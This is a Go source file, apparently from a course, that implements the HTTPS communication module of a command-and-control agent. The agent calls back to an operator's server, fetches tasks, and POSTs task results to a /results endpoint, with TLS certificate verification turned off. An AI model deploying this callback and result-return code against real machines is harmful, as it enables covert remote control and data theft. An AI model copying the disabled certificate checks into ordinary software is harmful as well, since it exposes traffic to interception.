package agent

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/faanross/16_hr_course_rough_dev/internals/server"
	"io"
	"log"
	"net/http"
)

// HTTPSAgent implements the Communicator interface for HTTPS
type HTTPSAgent struct {
	serverAddr           string // IP + Port for agent to call back to
	client               *http.Client
	commandOrchestrators map[string]OrchestratorFunc
}

// NewHTTPSAgent creates a new HTTPS agent
func NewHTTPSAgent(serverIP string, serverPort string) *HTTPSAgent {
	// Create TLS config that accepts self-signed certificates
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Create HTTP client with custom TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	agent := &HTTPSAgent{
		serverAddr:           fmt.Sprintf("%s:%s", serverIP, serverPort),
		client:               client,
		commandOrchestrators: make(map[string]OrchestratorFunc), // Initialize the map
	}

	registerCommands(agent) // Register individual commands

	return agent
}

// Send implements Communicator.Send for HTTPS
func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
	// Construct the URL
	url := fmt.Sprintf("https://%s/", c.serverAddr)

	// Create GET request
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("creating request: %w", err)
	}

	// Send request
	resp, err := c.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("sending request: %w", err)
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("server returned status %d: %s", resp.StatusCode, body)
	}

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("reading response: %w", err)
	}

	// Unmarshal into HTTPSResponse to validate structure
	var httpsResp server.HTTPSResponse
	if err := json.Unmarshal(body, &httpsResp); err != nil {
		return nil, fmt.Errorf("unmarshaling response: %w", err)
	}

	// Marshal back to json.RawMessage
	jsonData, err := json.Marshal(httpsResp)
	if err != nil {
		return nil, fmt.Errorf("marshaling response: %w", err)
	}

	return json.RawMessage(jsonData), nil
}

// SendResult performs a POST request to send task results back to server
func (agent *HTTPSAgent) SendResult(resultData []byte) error {
	targetURL := fmt.Sprintf("https://%s/results", agent.serverAddr)

	log.Printf("|RETURN RESULTS|-> Sending %d bytes of results via POST to %s", len(resultData), targetURL)

	// Create the HTTP POST request
	req, err := http.NewRequest(http.MethodPost, targetURL, bytes.NewReader(resultData))
	if err != nil {
		log.Printf("|❗ERR SendResult| Failed to create results request: %v", err)
		return fmt.Errorf("failed to create http results request: %w", err)
	}

	// Set the headers
	req.Header.Set("Content-Type", "application/json")

	// Execute the request
	resp, err := agent.client.Do(req)
	if err != nil {
		log.Printf("|❗ERR | Results POST request failed: %v", err)
		return fmt.Errorf("http results post request failed: %w", err)
	}
	defer resp.Body.Close() // Close body even if we don't read it, to release resources

	log.Printf("💥 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.")
	return nil
}
